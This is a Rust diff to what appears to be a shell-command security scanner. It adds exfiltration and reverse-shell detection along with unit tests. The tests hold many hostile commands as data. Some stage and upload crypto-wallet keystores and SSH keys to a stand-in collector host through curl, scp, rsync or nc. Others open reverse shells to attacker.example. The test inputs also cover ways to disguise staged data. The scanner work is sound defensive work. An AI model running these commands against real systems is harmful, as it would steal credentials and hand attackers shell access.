+                    | "irm" => Some((DataFlowSink::RemoteHttp, DataFlowOperation::RequestBody)),
+                    "scp" | "rsync" | "rclone" => {
+                        Some((DataFlowSink::RemoteCopy, DataFlowOperation::Copy))
+                    }
+                    "nc" | "ncat" | "netcat" | "socat" => {
+                        Some((DataFlowSink::RawSocket, DataFlowOperation::Upload))
+                    }
+                    "dig" | "nslookup" | "resolve-dnsname" => {
+                        Some((DataFlowSink::Dns, DataFlowOperation::DnsQuery))
+                    }
+                    _ => None,
+                }
+            } else {
+                None
+            };
+        if !found_direct_upload && !extended_has_direct_source {
+            if let Some((sink, operation)) = argument_sink {
+                match argument_flow {
+                    FlowProof::Sensitive => findings.push(classified_data_exfiltration_finding(
+                        sink,
+                        operation,
+                        DataFlowSource::SensitiveCommandSubstitution,
+                    )),
+                    FlowProof::Incomplete => findings.push(unresolved_sensitive_upload_finding()),
+                    FlowProof::Clean => {}
+                }
+            }
+        }
+        if direct_upload_incomplete && argument_flow != FlowProof::Sensitive {
+            findings.push(unresolved_sensitive_upload_finding());
+        }
         match extended_sink {
             ExtendedSinkProof::Remote {
                 sink,
@@ -9075,7 +10454,7 @@ fn check_data_exfiltration(
                 direct_path,
             } => {
                 let staged_flow = direct_path.as_deref().map_or(FlowProof::Clean, |path| {
-                    staged_flow_for_path(&staged, path, shell)
+                    staged_flow_for_path(staged, path, shell)
                 });
                 let flow = if consumes_stdin {
                     upload_input_flow
@@ -9113,7 +10492,7 @@ fn check_data_exfiltration(
                         let parsed = parse_dataflow_word(raw, shell);
                         !parsed.complete || parsed.dynamic_expansion
                     });
-                let staged_relevance = staged_argument_relevance(&staged, &effective.args, shell);
+                let staged_relevance = staged_argument_relevance(staged, &effective.args, shell);
                 if incoming_flow != FlowProof::Clean
                     || dynamic_remote_copy
                     || staged_relevance != FlowProof::Clean
@@ -9128,21 +10507,57 @@ fn check_data_exfiltration(
             FlowProof::Sensitive => FlowProof::Sensitive,
             FlowProof::Incomplete => FlowProof::Incomplete,
             FlowProof::Clean
-                if incoming_flow != FlowProof::Clean
+                if routing.stdin != FlowProof::Clean
                     && crate::env_guard::is_data_preserving_transform(&cmd_base) =>
             {
-                incoming_flow
+                routing.stdin
             }
             FlowProof::Clean => FlowProof::Clean,
         };
-        update_staged_lineage(&mut staged, seg, &cmd_base, shell, produced_flow);
-        pipe_flow = if stdout_is_redirected(seg, shell) {
-            FlowProof::Clean
+        update_staged_lineage(staged, seg, &cmd_base, shell, produced_flow);
+        let produced_stderr = if has_replacement {
+            replacement_stderr
         } else {
-            produced_flow
+            FlowProof::Clean
         };
         pipe_sensitive_path_list = !stdout_is_redirected(seg, shell) && emits_sensitive_path_list;
+        let (parent_stdout, parent_stderr) = route_flow(produced_flow, produced_stderr, routing);
+        summary.pipe_complete &= routing.complete;
+        pipe_flow = accumulate_segment_output(
+            segment_index,
+            pipe_connected,
+            seg.preceding_separator.as_deref(),
+            outgoing_separator,
+            parent_stdout,
+            parent_stderr,
+            &mut completed_stdout,
+            &mut completed_stderr,
+            &mut pipeline_stdout,
+            &mut pipeline_stderr,
+        );
+        let command_outcome = static_command_outcome(seg, &cmd_base, shell);
+        let joined_outcome = if conditional_alternate.is_some() {
+            match (separator, command_outcome) {
+                (Some("||") | Some("-or"), StaticCommandOutcome::Success) => {
+                    StaticCommandOutcome::Success
+                }
+                (Some("&&") | Some("-and"), StaticCommandOutcome::Failure) => {
+                    StaticCommandOutcome::Failure
+                }
+                _ => StaticCommandOutcome::Unknown,
+            }
+        } else {
+            command_outcome
+        };
+        if let Some(alternate) = conditional_alternate.take() {
+            merge_staged_dataflow(staged, alternate);
+        }
+        previous_entry = Some(current_entry);
+        previous_outcome = joined_outcome;
     }
+    summary.stdout = merge_flow_proof(completed_stdout, pipeline_stdout).into();
+    summary.stderr = merge_flow_proof(completed_stderr, pipeline_stderr).into();
+    summary
 }
 
 /*
@@ -13808,6 +15223,8 @@ mod tests {
             "cat ~/.ethereum/keystore | xxd > /tmp/c05-hex\nrsync /tmp/c05-hex user@collector.invalid:/drop/",
             "tar -cf /tmp/c05.tar ~/.ethereum/keystore; xh POST https://collector.invalid/upload file@/tmp/c05.tar",
             "cat ~/.ethereum/keystore >/tmp/c05.zip; zip /tmp/c05.zip README.md; scp /tmp/c05.zip user@collector.invalid:/drop/",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; false && echo clean >/tmp/c05-stage; curl -T /tmp/c05-stage https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; true || echo clean >/tmp/c05-stage; curl -T /tmp/c05-stage https://collector.invalid/upload",
         ] {
             assert!(
                 c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
@@ -13822,6 +15239,8 @@ mod tests {
             "cat ~/.ethereum/keystore > /tmp/c05-stage; rm /tmp/c05-stage; scp /tmp/c05-stage user@collector.invalid:/drop/",
             "cat ~/.ethereum/keystore > /tmp/c05-stage || scp /tmp/c05-stage user@collector.invalid:/drop/",
             "cat ~/.ethereum/keystore > /tmp/c05-stage & scp /tmp/c05-stage user@collector.invalid:/drop/",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; false || echo clean >/tmp/c05-stage; curl -T /tmp/c05-stage https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; true && echo clean >/tmp/c05-stage; curl -T /tmp/c05-stage https://collector.invalid/upload",
         ] {
             assert!(
                 !c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
@@ -13838,6 +15257,270 @@ mod tests {
             ShellType::Posix,
             RuleId::AnalysisIncomplete,
         ));
+        assert!(c05_has(
+            "cat ~/.ethereum/keystore > /tmp/c05-stage & scp /tmp/c05-stage user@collector.invalid:/drop/",
+            ShellType::Posix,
+            RuleId::AnalysisIncomplete,
+        ));
+    }
+
+    #[test]
+    fn c05_staged_path_identity_collapses_dot_components() {
+        for input in [
+            "cat ~/.ethereum/keystore >./c05-stage; curl -T c05-stage https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >c05-stage; curl -T ./c05-stage https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >dir/./c05-stage; curl -T dir/c05-stage https://collector.invalid/upload",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "dot-component spelling laundered staged lineage: {input}"
+            );
+        }
+        assert!(!c05_has(
+            "cat ~/.ethereum/keystore >./c05-stage; curl -T other/c05-stage https://collector.invalid/upload",
+            ShellType::Posix,
+            RuleId::DataExfiltration,
+        ));
+    }
+
+    #[test]
+    fn c05_operand_outputs_preserve_and_overwrite_staged_lineage() {
+        for input in [
+            "cat ~/.ethereum/keystore | tee /tmp/c05-tee >/dev/null; curl -T /tmp/c05-tee https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore | tee -- /tmp/c05-tee-a /tmp/c05-tee-b >/dev/null; scp /tmp/c05-tee-b user@collector.invalid:/drop/",
+            "cat ~/.ethereum/keystore | dd of=/tmp/c05-dd status=none; scp /tmp/c05-dd user@collector.invalid:/drop/",
+            "cat ~/.ethereum/keystore >/tmp/c05-source; cp /tmp/c05-source /tmp/c05-copy; curl -T /tmp/c05-copy https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-source; cp -- /tmp/c05-source /tmp/c05-copy; curl -T /tmp/c05-copy https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-source; cp -p /tmp/c05-source /tmp/c05-copy; curl -T /tmp/c05-copy https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-source; mv /tmp/c05-source /tmp/c05-moved; rsync /tmp/c05-moved user@collector.invalid:/drop/",
+            "cat ~/.ethereum/keystore >/tmp/c05-source; mv -f /tmp/c05-source /tmp/c05-moved; rsync /tmp/c05-moved user@collector.invalid:/drop/",
+            "cat ~/.ethereum/keystore >/tmp/c05-source; install -m 600 /tmp/c05-source /tmp/c05-installed; curl -T /tmp/c05-installed https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-source; dd if=/tmp/c05-source of=/tmp/c05-dd status=none; curl -T /tmp/c05-dd https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore | openssl enc -aes-256-cbc -out /tmp/c05-cipher; scp /tmp/c05-cipher user@collector.invalid:/drop/",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "operand output laundered staged flow: {input}"
+            );
+        }
+
+        for input in [
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; echo safe | tee /tmp/c05-stage >/dev/null; curl -T /tmp/c05-stage https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; echo safe | dd of=/tmp/c05-stage status=none; scp /tmp/c05-stage user@collector.invalid:/drop/",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; cp -t /tmp/c05-target /tmp/c05-stage; curl -T /tmp/c05-target https://collector.invalid/upload",
+        ] {
+            assert!(
+                !c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "clean overwrite or ambiguous option form became confirmed: {input}"
+            );
+        }
+
+        assert!(c05_has(
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; echo safe | tee -a /tmp/c05-stage >/dev/null; curl -T /tmp/c05-stage https://collector.invalid/upload",
+            ShellType::Posix,
+            RuleId::DataExfiltration,
+        ));
+        assert!(c05_has(
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; echo safe | tee -ai /tmp/c05-stage >/dev/null; curl -T /tmp/c05-stage https://collector.invalid/upload",
+            ShellType::Posix,
+            RuleId::DataExfiltration,
+        ));
+        assert!(c05_has(
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; echo safe | dd of=/tmp/c05-stage oflag=append status=none; curl -T /tmp/c05-stage https://collector.invalid/upload",
+            ShellType::Posix,
+            RuleId::DataExfiltration,
+        ));
+        assert!(c05_has(
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; echo safe | dd of=/tmp/c05-stage conv=notrunc status=none; curl -T /tmp/c05-stage https://collector.invalid/upload",
+            ShellType::Posix,
+            RuleId::DataExfiltration,
+        ));
+        assert!(c05_has(
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; cp -t /tmp/c05-target /tmp/c05-stage; curl -T /tmp/c05-target https://collector.invalid/upload",
+            ShellType::Posix,
+            RuleId::AnalysisIncomplete,
+        ));
+    }
+
+    #[test]
+    fn c05_failure_side_effects_and_transfer_identity_never_launder_lineage() {
+        let partial_failure =
+            "cat ~/.ethereum/keystore /definitely-missing >/tmp/c05-stage || curl -T /tmp/c05-stage https://collector.invalid/upload";
+        assert!(c05_has(
+            partial_failure,
+            ShellType::Posix,
+            RuleId::AnalysisIncomplete,
+        ));
+
+        for input in [
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; cp /tmp/c05-stage /tmp/c05-drop/; curl -T /tmp/c05-drop/c05-stage https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; cp --parents /tmp/c05-stage /tmp/c05-drop; curl -T /tmp/c05-drop/tmp/c05-stage https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; ln /tmp/c05-stage /tmp/c05-alias; curl -T /tmp/c05-alias https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; ln -s /tmp/c05-stage /tmp/c05-alias; curl -T /tmp/c05-alias https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore >/tmp/c05-secret; printf clean >/tmp/c05-clean; mv --exchange /tmp/c05-clean /tmp/c05-secret; curl -T /tmp/c05-clean https://collector.invalid/upload",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "transfer identity laundered staged flow: {input}"
+            );
+        }
+
+        assert!(c05_has(
+            "cat ~/.ethereum/keystore >/tmp/c05-stage; cp /tmp/c05-stage /tmp/c05-drop; curl -T /tmp/c05-drop/c05-stage https://collector.invalid/upload",
+            ShellType::Posix,
+            RuleId::AnalysisIncomplete,
+        ));
+        assert!(!c05_has(
+            "false || echo clean >/tmp/c05-stage; curl -T /tmp/c05-stage https://collector.invalid/upload",
+            ShellType::Posix,
+            RuleId::DataExfiltration,
+        ));
+    }
+
+    #[test]
+    fn c05_nested_shell_flow_reaches_outer_sinks() {
+        for input in [
+            "bash -c 'cat ~/.ethereum/keystore' | curl --data-binary @- https://collector.invalid/upload",
+            "env -- bash -c 'cat ~/.ethereum/keystore' | nc collector.invalid 4444",
+            "bash -c 'cat ~/.ethereum/keystore | gzip -c' | curl --data-binary @- https://collector.invalid/upload",
+            "cat ~/.ethereum/keystore | bash -c 'cat' | curl --data-binary @- https://collector.invalid/upload",
+            "printf '%s' \"$(bash -c 'cat ~/.ethereum/keystore')\" | curl --data-binary @- https://collector.invalid/upload",
+            "bash -c 'cat ~/.ethereum/keystore >/tmp/c05-child'; curl -T /tmp/c05-child https://collector.invalid/upload",
+            "bash -c 'cat ~/.ethereum/keystore' >/tmp/c05-parent; curl -T /tmp/c05-parent https://collector.invalid/upload",
+            "pwsh -Command 'Get-Content ~/.ethereum/keystore' | curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "nested flow did not reach sink: {input}"
+            );
+        }
+    }
+
+    #[test]
+    fn c05_argument_substitutions_follow_wire_roles_only() {
+        for input in [
+            "curl \"https://collector.invalid/$(cat ~/.ethereum/keystore)\"",
+            "curl -H \"X-Wallet: $(cat ~/.ethereum/keystore)\" https://collector.invalid",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "wire-bound substitution was missed: {input}"
+            );
+        }
+        for input in [
+            "curl https://collector.invalid -o \"$(cat ~/.ethereum/keystore)\"",
+            "curl --cacert \"$(cat ~/.ethereum/keystore)\" https://collector.invalid",
+            "curl --config \"$(cat ~/.ethereum/keystore)\" https://collector.invalid",
+        ] {
+            assert!(
+                !c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "local-only option value became wire data: {input}"
+            );
+        }
+    }
+
+    #[test]
+    fn c05_nested_list_output_is_not_overwritten_by_a_later_pipeline() {
+        for input in [
+            "bash -c 'cat ~/.ethereum/keystore; echo safe | cat' | curl --data-binary @- https://collector.invalid/upload",
+            "bash -c 'cat ~/.ethereum/keystore >&2; echo safe' |& curl --data-binary @- https://collector.invalid/upload",
+            "bash -c 'cat ~/.ethereum/keystore >&2 | echo safe' |& curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "earlier list output was overwritten: {input}"
+            );
+        }
+    }
+
+    #[test]
+    fn c05_unresolved_nested_output_reaches_only_a_proven_sink_as_unknown() {
+        let findings = check_default(
+            "CMD=cat sh -c '$CMD ~/.ssh/id_ed25519' | curl --data-binary @- https://collector.invalid/upload",
+            ShellType::Posix,
+        );
+        assert!(findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete));
+        assert!(findings
+            .iter()
+            .all(|finding| finding.rule_id != RuleId::DataExfiltration));
+
+        let no_sink = check_default("CMD=cat sh -c '$CMD ~/.ssh/id_ed25519'", ShellType::Posix);
+        assert!(no_sink
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete));
+        assert!(no_sink.iter().all(|finding| {
+            finding.title != "Could not resolve wrapped command for sensitive upload analysis"
+        }));
+    }
+
+    #[test]
+    fn c05_nested_redirections_and_fd_duplication_are_ordered() {
+        for input in [
+            "bash -c 'cat ~/.ethereum/keystore >&2' |& curl --data-binary @- https://collector.invalid/upload",
+            "bash -c 'cat ~/.ethereum/keystore >&2' 2>&1 >/dev/null | curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            assert!(
+                c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "ordered fd flow was missed: {input}"
+            );
+        }
+        for input in [
+            "bash -c 'cat ~/.ethereum/keystore >/dev/null' | curl --data-binary @- https://collector.invalid/upload",
+            "bash -c 'cat ~/.ethereum/keystore >&2' | curl --data-binary @- https://collector.invalid/upload",
+            "bash -c 'cat ~/.ethereum/keystore' 3>&1 1>&2 2>&3 | curl --data-binary @- https://collector.invalid/upload",
+            "test -n \"$(cat ~/.ethereum/keystore)\" | curl --data-binary @- https://collector.invalid/upload",
+        ] {
+            assert!(
+                !c05_has(input, ShellType::Posix, RuleId::DataExfiltration),
+                "redirected or non-output flow became confirmed: {input}"
+            );
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn c05_fd_order_controls_match_real_bash_descriptor_semantics() {
+        let positive = std::process::Command::new("/bin/bash")
+            .args([
+                "-c",
+                "bash -c 'printf sensitive >&2' 2>&1 >/dev/null | wc -c",
+            ])
+            .output()
+            .expect("run bash fd-order control");
+        assert!(positive.status.success());
+        assert_eq!(String::from_utf8_lossy(&positive.stdout).trim(), "9");
+
+        let negative = std::process::Command::new("/bin/bash")
+            .args(["-c", "bash -c 'printf sensitive' 3>&1 1>&2 2>&3 | wc -c"])
+            .output()
+            .expect("run bash fd-swap control");
+        assert!(negative.status.success());
+        assert_eq!(String::from_utf8_lossy(&negative.stdout).trim(), "0");
+    }
+
+    #[test]
+    fn c05_nested_staged_lineage_is_invalidated_and_child_findings_are_not_duplicated() {
+        let invalidated = "bash -c 'cat ~/.ethereum/keystore >/tmp/c05-child; rm /tmp/c05-child'; curl -T /tmp/c05-child https://collector.invalid/upload";
+        assert!(!c05_has(
+            invalidated,
+            ShellType::Posix,
+            RuleId::DataExfiltration,
+        ));
+
+        let findings = check_default(
+            "bash -c 'cat ~/.ethereum/keystore | curl --data-binary @- https://collector.invalid/upload'",
+            ShellType::Posix,
+        );
+        assert_eq!(
+            findings
+                .iter()
+                .filter(|finding| finding.rule_id == RuleId::DataExfiltration)
+                .count(),
+            1,
+            "the child exfiltration chain was emitted again by its parent"
+        );
     }
 
     #[test]
@@ -13915,5 +15598,93 @@ mod tests {
         assert!(serialized.contains("tirith:v1:classified_data_flow"));
         assert!(serialized.contains("type=wallet_artifact"));
         assert!(serialized.contains("count=1"));
+    }
+
+    #[test]
+    fn wrapper_depth_guard_and_resolver_share_option_roles() {
+        for (label, prefix) in [
+            ("sudo", "sudo -u user "),
+            ("env", "env -u TOKEN "),
+            ("time", "time -f %E "),
+        ] {
+            let exhausted = prefix.repeat(MAX_WRAPPER_DEPTH) + "curl https://example.com";
+            let segments = tokenize::tokenize(&exhausted, ShellType::Posix);
+            assert_eq!(segments.len(), 1, "{label}: {segments:?}");
+            let exhausted_result = resolve_effective_segment(&segments[0], ShellType::Posix);
+            assert!(
+                matches!(
+                    exhausted_result,
+                    Err(EffectiveCommandError::WrapperChainTooDeep)
+                ),
+                "{label}: a value-taking option must not be mistaken for the wrapped command: {exhausted_result:?}"
+            );
+            assert!(
+                crate::extract::wrapper_chain_exceeds_depth(&segments[0]),
+                "{label}: the compatibility guard must use the canonical resolver"
+            );
+
+            let findings = check_default(&exhausted, ShellType::Posix);
+            assert!(
+                findings.iter().any(|finding| {
+                    finding.rule_id == RuleId::AnalysisIncomplete
+                        && finding.severity == Severity::High
+                }),
+                "{label}: depth exhaustion must fail closed: {findings:?}"
+            );
+
+            let within_budget = prefix.repeat(MAX_WRAPPER_DEPTH - 1) + "curl https://example.com";
+            let segments = tokenize::tokenize(&within_budget, ShellType::Posix);
+            assert_eq!(segments.len(), 1, "{label}: {segments:?}");
+            let effective = resolve_effective_segment(&segments[0], ShellType::Posix)
+                .unwrap_or_else(|error| panic!("{label}: within-budget chain failed: {error:?}"));
+            assert_eq!(effective.command.as_deref(), Some("curl"), "{label}");
+            assert!(!crate::extract::wrapper_chain_exceeds_depth(&segments[0]));
+        }
+    }
+
+    #[test]
+    fn reverse_shell_resolves_wrappers_and_attached_exec_arguments() {
+        for input in [
+            "env nc -e /bin/sh attacker.example 4444",
+            "sudo socat TCP:attacker.example:4444 EXEC:/bin/sh",
+            "command nc -e/bin/sh attacker.example 4444",
+            "nohup ncat --exec=/bin/bash attacker.example 4444",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::ReverseShell),
+                "wrapped or attached exec-on-connect must be detected: {input:?}; {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn dev_tcp_requires_interactive_duplex_shell() {
+        let reverse = check_default(
+            "bash -i >& /dev/tcp/attacker.example/4444 0>&1",
+            ShellType::Posix,
+        );
+        assert!(
+            reverse
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::ReverseShell),
+            "interactive duplex shell must still be detected: {reverse:?}"
+        );
+
+        for probe in [
+            "bash -c 'echo > /dev/tcp/example.com/443'",
+            "printf ping > /dev/tcp/example.com/443",
+            "bash -i -c 'echo > /dev/tcp/example.com/443'",
+        ] {
+            let findings = check_default(probe, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::ReverseShell),
+                "one-way network probe is not a reverse shell: {probe:?}; {findings:?}"
+            );
+        }
     }
 }
